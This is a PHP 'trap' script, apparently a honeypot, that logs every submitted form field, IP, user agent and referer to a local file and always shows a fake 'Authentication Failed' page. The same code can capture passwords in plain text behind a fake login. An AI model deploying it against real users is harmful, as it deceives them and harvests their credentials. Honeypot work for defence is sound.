<?php
// trap.php — form submission sink.
// Logs every POST/GET field to traps.log, returns a generic auth-failed page.
// No conditionals, no smarts: every submission is "wrong".

$logFile = __DIR__ . "/traps.log";

function _trap_norm($v) {
  // Keep each entry on one log line.
  return str_replace(array("\r", "\n"), array("\\r", "\\n"), (string)$v);
}

function _trap_log($line) {
  global $logFile;
  @file_put_contents($logFile, "[" . date("Y-m-d H:i:s") . "] " . $line . "\n", FILE_APPEND);
}

$ip     = isset($_SERVER["REMOTE_ADDR"])     ? $_SERVER["REMOTE_ADDR"]     : "?";
$ua     = _trap_norm(isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : "?");
$ref    = _trap_norm(isset($_SERVER["HTTP_REFERER"])    ? $_SERVER["HTTP_REFERER"]    : "?");
$method = isset($_SERVER["REQUEST_METHOD"]) ? $_SERVER["REQUEST_METHOD"] : "?";

$fields = array();
foreach ($_POST as $k => $v) {
  $fields[] = "P:" . _trap_norm($k) . "=" . _trap_norm($v);
}
foreach ($_GET as $k => $v) {
  $fields[] = "G:" . _trap_norm($k) . "=" . _trap_norm($v);
}

_trap_log(sprintf(
  "ip=%s method=%s ref=%s ua=%s fields={%s}",
  $ip, $method, $ref, $ua, implode(" || ", $fields)
));
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Authentication Failed</title>
</head>
<body bgcolor="#FFFFFF">
<center>
<font size="+1" color="#990000"><b>Authentication Failed</b></font>
<hr>
<font size="-1">
<p>The username or password you entered is incorrect.</p>
<p>If the problem persists, please contact your system administrator.</p>
</font>
<p><a href="go.php?p=index.php&label=Server_Links">Return to Server Links</a></p>
</center>
</body>
</html>
